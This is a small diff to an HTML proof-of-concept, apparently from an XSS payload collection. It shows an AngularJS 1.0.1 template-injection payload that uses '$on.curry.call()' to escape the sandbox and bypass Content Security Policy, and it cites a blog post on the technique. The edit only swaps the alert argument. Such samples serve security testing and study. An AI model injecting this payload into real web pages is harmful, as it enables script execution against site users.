@@ -9,7 +9,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
     <div ng-app ng-csp>
 
-    {{$on.curry.call().alert(document.domain)}}
+    {{$on.curry.call().alert('XSS!')}}
 
     </div>
     source: <a href="https://blog.0daylabs.com/2016/09/09/bypassing-csp/">https://blog.0daylabs.com/2016/09/09/bypassing-csp/</a>
